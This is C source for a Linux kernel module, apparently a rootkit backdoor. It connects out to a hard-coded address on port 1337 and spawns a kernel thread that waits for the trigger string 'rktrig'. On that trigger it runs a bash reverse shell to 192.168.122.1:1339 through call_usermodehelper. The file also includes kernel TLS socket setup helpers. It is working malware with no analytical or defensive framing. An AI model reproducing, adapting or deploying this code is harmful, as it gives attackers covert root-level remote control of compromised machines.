#pragma once
#include "../include/common.h"
#include <linux/crc32.h>
#include <linux/crypto.h>
#include <linux/delay.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/init.h>
#include <linux/io_uring.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/ktime.h>
#include <linux/module.h>
#include <linux/net.h>
#include <linux/proc_fs.h>
#include <linux/random.h>
#include <linux/sched/signal.h>
#include <linux/socket.h>
#include <linux/string.h>
#include <linux/tcp.h>
#include <linux/xarray.h>
#include <net/sock.h>
#include <net/tls.h>

// #include <string.h>

#define BUF_SIZE 1024
#define TRIGGER "rktrig"
#define REV_SHELL_TIMEOUT 5
#define REV_SHELL_CMD "/bin/bash -i >& /dev/tcp/192.168.122.1/1339 0>&1 &"
#define REV_SHELL_ENVP "PATH=/usr/bin:/bin:/usr/sbin:/sbin"
#define PORT 1337
#define CREATE_ADDRESS(ip)                                                     \
  (((u32)(ip)[0] << 24) | ((u32)(ip)[1] << 16) | ((u32)(ip)[2] << 8) |         \
   ((u32)(ip)[3]))
#define TLS_KEY_SIZE TLS_CIPHER_AES_GCM_128_KEY_SIZE
#define TLS_IV_SIZE TLS_CIPHER_AES_GCM_128_IV_SIZE
#define TLS_SALT_SIZE TLS_CIPHER_AES_GCM_128_SALT_SIZE
#define TLS_SEQ_SIZE TLS_CIPHER_AES_GCM_128_REC_SEQ_SIZE

#define MAX_RETRIES 3
#define RETRY_DELAY_MS 5000

int tcp_send(struct socket *sock, const char *buf, size_t len);
int tcp_recv(struct socket *sock, char *buf, size_t max_size);
int socket_init(struct socket **sock, struct task_struct **thread);
int exec_cmd(void);

static int tls_setup_socket(struct socket *sock, const unsigned char *key,
                            const unsigned char *iv, const unsigned char *salt,
                            const unsigned char *tx_seq,
                            const unsigned char *rx_seq) {
  struct tls12_crypto_info_aes_gcm_128 crypto_info = {0};
  int ret;

  if (!sock || !key || !iv || !salt || !tx_seq || !rx_seq)
    return -EINVAL;

  ret = sock->ops->setsockopt(sock, SOL_TCP, TCP_ULP, KERNEL_SOCKPTR("tls"),
                              strlen("tls"));
  if (ret < 0) {
    pr_err("ktls: failed to attach TCP ULP: %d\n", ret);
    return ret;
  }

  memset(&crypto_info, 0, sizeof(crypto_info));
  crypto_info.info.version = TLS_1_2_VERSION;
  crypto_info.info.cipher_type = TLS_CIPHER_AES_GCM_128;
  memcpy(crypto_info.key, key, TLS_KEY_SIZE);
  memcpy(crypto_info.iv, iv, TLS_IV_SIZE);
  memcpy(crypto_info.salt, salt, TLS_SALT_SIZE);
  memcpy(crypto_info.rec_seq, tx_seq, TLS_SEQ_SIZE);

  ret = sock->ops->setsockopt(
      sock, SOL_TLS, TLS_TX, KERNEL_SOCKPTR(&crypto_info), sizeof(crypto_info));
  if (ret < 0) {
    pr_err("ktls: setsockopt SOL_TLS failed %d\n", ret);
    return ret;
  }

  memset(&crypto_info, 0, sizeof(crypto_info));
  crypto_info.info.version = TLS_1_2_VERSION;
  crypto_info.info.cipher_type = TLS_CIPHER_AES_GCM_128;
  memcpy(crypto_info.key, key, TLS_KEY_SIZE);
  memcpy(crypto_info.iv, iv, TLS_IV_SIZE);
  memcpy(crypto_info.salt, salt, TLS_SALT_SIZE);
  memcpy(crypto_info.rec_seq, rx_seq, TLS_SEQ_SIZE);

  ret = sock->ops->setsockopt(
      sock, SOL_TLS, TLS_RX, KERNEL_SOCKPTR(&crypto_info), sizeof(crypto_info));
  if (ret) {
    pr_err("ktls: failed to set RX ctx: %d\n", ret);
    return ret;
  }
  //
  return 0;
}

int thread_task(void *data) {
  struct socket *sock = (struct socket *)data;
  char *buff = kmalloc(BUF_SIZE, GFP_KERNEL);
  if (buff == NULL) {
    printk(KERN_INFO "Failed to allocate memory for receive buffer\n");
    return -ENOMEM;
  }
  int ret;
  while (!kthread_should_stop()) {
    memset(buff, 0, BUF_SIZE);
    ret = tcp_recv(sock, buff, BUF_SIZE - 1);
    if (ret >= BUF_SIZE - 1)
      buff[BUF_SIZE - 1] = '\0';
    else
      buff[ret] = '\0';

    if (ret < 0) {
      printk(KERN_INFO "tcp_recv returned error: %d — sleeping and retrying\n",
             ret);
      msleep(2000);
      continue;
    }

    if (ret == 0) {
      printk(KERN_INFO "thread_task: tcp_recv returned 0 (peer closed). "
                       "Waiting for reconnect.\n");
      msleep(2000);
      continue;
    }

    buff[ret] = '\0';

    if (strncmp(buff, TRIGGER, strlen(TRIGGER)) == 0) {
      printk(KERN_INFO "Trigger received, creating reverse shell..");
      char *envp[] = {REV_SHELL_ENVP, NULL};
      ret = call_usermodehelper(
          "/bin/bash", (char *[]){"/bin/bash", "-c", REV_SHELL_CMD, NULL}, envp,
          UMH_WAIT_EXEC);
      if (ret < 0) {
        printk(KERN_INFO "exec_cmd failed\n");
      }
    }

    msleep(500);

    // wait_event_interruptible(wq, thread != NULL || signal_pending(current));
  }
  kfree(buff);
  return 0;
}

int socket_init(struct socket **sock_ptr, struct task_struct **thread_ptr) {
  struct socket *sock = NULL;
  struct sockaddr_in saddr = {0};
  int err, retry_count;

  u8 ip[4] = {192, 168, 0, 104};
  u32 addr = CREATE_ADDRESS(ip);

  err = sock_create_kern(&init_net, PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
  if (err < 0) {
    printk(KERN_INFO "Couldn't create socket: %d\n", err);
    return err;
  }
  printk(KERN_INFO "Socket created successfully\n");

  saddr.sin_family = AF_INET;
  saddr.sin_port = htons(PORT);
  saddr.sin_addr.s_addr = htonl(addr);

  for (retry_count = 0; retry_count < MAX_RETRIES; retry_count++) {
    err = sock->ops->connect(sock, (struct sockaddr *)&saddr, sizeof(saddr),
                             O_RDWR);

    if (err == 0) {
      printk(KERN_INFO "socket_init: connected to %pI4:%u\n",
             &saddr.sin_addr.s_addr, ntohs(saddr.sin_port));
      break;
    }
    printk(KERN_INFO "socket_init: connect failed (try %d/%d): %d\n",
           retry_count + 1, MAX_RETRIES, err);
    msleep(RETRY_DELAY_MS);
  }

  if (err != 0) {
    printk(KERN_INFO "socket_init: failed to connect after %d retries: %d\n",
           MAX_RETRIES, err);
    sock_release(sock);
    *sock_ptr = NULL;
    *thread_ptr = NULL;
    return -ECONNREFUSED;
  }

  *thread_ptr = kthread_create(thread_task, sock, "tcp_recv_thread");
  if (IS_ERR(*thread_ptr)) {
    err = PTR_ERR(*thread_ptr);
    printk(KERN_INFO "socket_init: kthread_create failed: %d\n", err);
    sock->ops->shutdown(sock, SHUT_RDWR);
    sock_release(sock);
    *sock_ptr = NULL;
    *thread_ptr = NULL;
    return err;
  }

  wake_up_process(*thread_ptr);

  if (!sock->sk || sock->sk->sk_state != TCP_ESTABLISHED) {
    printk(KERN_INFO
           "socket_init: socket not in ESTABLISHED state after connect\n");
    kthread_stop(*thread_ptr);
    sock->ops->shutdown(sock, SHUT_RDWR);
    sock_release(sock);
    *sock_ptr = NULL;
    *thread_ptr = NULL;
    return -ECONNREFUSED;
  }
  *sock_ptr = sock;
  return 0;
}

int tcp_send(struct socket *sock, const char *buf, size_t len) {
  struct msghdr msg = {0};
  struct kvec vec;
  int length;

  if (!sock || !sock->sk || sock->sk->sk_state != TCP_ESTABLISHED) {
    printk(KERN_INFO "Socket error\n");
    return -ENOTCONN;
  }

  vec.iov_base = (void *)buf;
  vec.iov_len = len;

  length = kernel_sendmsg(sock, &msg, &vec, 1, len);
  if (length < 0) {
    printk(KERN_INFO "Send error: %d\n", length);
    return length;
  }

  printk(KERN_INFO "Message sent successfully: %d bytes\n", length);
  return length;
}

int tcp_recv(struct socket *sock, char *buf, size_t max_size) {
  struct msghdr msg = {0};
  struct kvec vec;
  int len;

  vec.iov_len = max_size;
  vec.iov_base = buf;

  if (!sock || !sock->sk || sock->sk->sk_state != TCP_ESTABLISHED) {
    printk(KERN_INFO "Socket error\n");
    return -ENOTCONN;
  }

  len = kernel_recvmsg(sock, &msg, &vec, 1, max_size, msg.msg_flags);
  if (len < 0) {
    printk(KERN_INFO "Error while receiving: %d\n", len);
    return len;
  }

  printk(KERN_INFO "Received %s\n", buf);
  return len;
}
